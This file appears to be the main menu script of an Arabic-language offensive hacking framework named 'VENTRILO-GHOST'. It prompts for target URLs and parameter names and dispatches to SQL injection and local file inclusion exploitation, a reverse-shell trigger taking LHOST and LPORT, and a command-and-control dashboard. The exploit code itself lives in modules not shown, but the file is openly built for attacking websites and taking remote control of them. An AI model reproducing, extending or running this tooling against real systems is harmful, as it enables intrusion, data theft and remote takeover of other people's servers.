import asyncio
import sys
import os
from colorama import Fore, Style, init

# استيراد الوحدات التي طورناها في مجلد core
from core.scanner import GhostScanner
from core.exploiter import GhostExploiter

# تهيئة الألوان
init(autoreset=True)

def banner():
    print(f"""
    {Fore.BLUE}############################################################
    #                                                          #
    #   {Fore.WHITE}VENTRILO-GHOST FRAMEWORK v2.0 - 2026               {Fore.BLUE}#
    #   {Fore.CYAN}Developed by: SayerLinux                           {Fore.BLUE}#
    #   {Fore.CYAN}Email: mailto:SaudiLinux1@gmail.com                       {Fore.BLUE}#
    #                                                          #
    ############################################################
    """)

async def main():
    os.system('cls' if os.name == 'nt' else 'clear')
    banner()
    
    print(f"{Fore.YELLOW}[1] {Fore.WHITE}بدء الفحص العميق والعنكبوت (Deep Scan & Spider)")
    print(f"{Fore.YELLOW}[2] {Fore.WHITE}اختبار استغلال SQL Injection")
    print(f"{Fore.YELLOW}[3] {Fore.WHITE}اختبار استغلال LFI (تضمين ملفات النظام)")
    print(f"{Fore.YELLOW}[4] {Fore.WHITE}فتح اتصال عكسي والتحكم الكامل (Reverse Shell)")
    print(f"{Fore.YELLOW}[5] {Fore.WHITE}تشغيل لوحة التحكم C2 (Dashboard)")
    print(f"{Fore.RED}[0] {Fore.WHITE}خروج (Exit)")
    
    choice = input(f"
{Fore.BLUE}[SayerLinux-Ghost]> {Fore.WHITE}")

    if choice == '1':
        target = input(f"{Fore.CYAN}[?] أدخل رابط الموقع المستهدف: {Fore.WHITE}")
        scanner = GhostScanner(target)
        await scanner.start()
    
    elif choice in ['2', '3', '4']:
        target = input(f"{Fore.CYAN}[?] أدخل رابط الصفحة المصابة: {Fore.WHITE}")
        exploiter = GhostExploiter(target)
        
        if choice == '2':
            param = input(f"{Fore.CYAN}[?] أدخل اسم المعامل المصاب (مثل id): {Fore.WHITE}")
            exploiter.verify_sqli(param)
        
        elif choice == '3':
            param = input(f"{Fore.CYAN}[?] أدخل اسم المعامل المصاب (مثل file): {Fore.WHITE}")
            exploiter.test_lfi(param)
            
        elif choice == '4':
            lhost = input(f"{Fore.CYAN}[?] أدخل عنوان IP الخاص بك (LHOST): {Fore.WHITE}")
            lport = input(f"{Fore.CYAN}[?] أدخل المنفذ (LPORT): {Fore.WHITE}")
            exploiter.trigger_reverse_shell(lhost, lport)
            
    elif choice == '5':
        print(f"{Fore.GREEN}[*] جاري تشغيل لوحة التحكم C2... افتح المتصفح على http://localhost:5000")
        os.system("python c2_server/app.py")
        
    elif choice == '0':
        print(f"{Fore.RED}[!] وداعاً يا بطل!")
        sys.exit()
    
    else:
        print(f"{Fore.RED}[!] اختيار خاطئ!")

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print(f"
{Fore.RED}[!] تم إيقاف البرنامج.")